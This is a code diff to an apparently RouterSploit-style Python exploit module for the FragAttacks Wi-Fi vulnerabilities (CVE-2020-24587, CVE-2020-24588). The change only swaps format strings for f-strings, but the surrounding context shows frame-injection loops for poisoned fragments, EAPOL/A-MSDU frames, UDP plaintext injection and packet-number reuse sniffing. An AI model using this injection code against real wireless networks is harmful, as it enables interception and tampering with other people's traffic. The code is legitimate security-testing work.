@@ -245,7 +245,7 @@ class Exploit(Exploit):
                 line = line.strip()
                 if line.startswith("wiphy "):
                     phy_idx = line.split()[-1]
-                    phy_name = "phy{}".format(phy_idx)
+                    phy_name = f"phy{phy_idx}"
                     break
 
             if not phy_name:
@@ -294,8 +294,7 @@ class Exploit(Exploit):
             sendp(frag1, iface=self.interface, verbose=False)
             time.sleep(self.inject_delay)
 
-        print_success("Injected {} poisoned first fragments (seq=42, tid={}).".format(
-            self.inject_count, self.qos_tid))
+        print_success(f"Injected {self.inject_count} poisoned first fragments (seq=42, tid={self.qos_tid}).")
 
     def _mixed_key_attack(self) -> None:
         """Mixed key fragment reassembly (CVE-2020-24587).
@@ -350,7 +349,7 @@ class Exploit(Exploit):
             sendp(frame, iface=self.interface, verbose=False)
             time.sleep(self.inject_delay)
 
-        print_success("Injected {} EAPOL/A-MSDU frames.".format(self.inject_count))
+        print_success(f"Injected {self.inject_count} EAPOL/A-MSDU frames.")
 
     def _udp_plaintext_inject(self) -> None:
         """UDP plaintext injection via fragmentation (issue #56).
@@ -377,8 +376,7 @@ class Exploit(Exploit):
             sendp(frag2, iface=self.interface, verbose=False)
             time.sleep(self.inject_delay)
 
-        print_success("Injected {} UDP plaintext fragment pairs to port {}.".format(
-            self.inject_count, self.target_port))
+        print_success(f"Injected {self.inject_count} UDP plaintext fragment pairs to port {self.target_port}.")
 
     def _pn_reuse_test(self) -> None:
         """Test for PN/IV reuse after rekeying (CVE-2020-24588).
@@ -400,8 +398,7 @@ class Exploit(Exploit):
                     seen_pns[mac] = []
 
                 if seen_pns[mac] and pn <= seen_pns[mac][-1]:
-                    print_success("[PN REUSE] {} PN={} <= prev={}".format(
-                        mac, pn, seen_pns[mac][-1]))
+                    print_success(f"[PN REUSE] {mac} PN={pn} <= prev={seen_pns[mac][-1]}")
 
                 seen_pns[mac].append(pn)
                 if len(seen_pns[mac]) > 1000:
@@ -415,8 +412,7 @@ class Exploit(Exploit):
 
         for mac, pns in seen_pns.items():
             if pns:
-                print_info("{}: {} PNs observed, range [{}, {}]".format(
-                    mac, len(pns), min(pns), max(pns)))
+                print_info(f"{mac}: {len(pns)} PNs observed, range [{min(pns)}, {max(pns)}]")
 
 
     def check(self) -> str:
@@ -458,11 +454,11 @@ class Exploit(Exploit):
 
         if self.dry_run:
             print_info("FragAttacks Configuration:")
-            print_info("  Interface: {}".format(self.interface))
-            print_info("  Attack:    {}".format(self.attack))
-            print_info("  BSSID:     {}".format(self.target_bssid))
-            print_info("  Client:    {}".format(self.target_client))
-            print_info("  Channel:   {}".format(self.channel))
+            print_info(f"  Interface: {self.interface}")
+            print_info(f"  Attack:    {self.attack}")
+            print_info(f"  BSSID:     {self.target_bssid}")
+            print_info(f"  Client:    {self.target_client}")
+            print_info(f"  Channel:   {self.channel}")
             return
 
         if os.getuid() != 0:
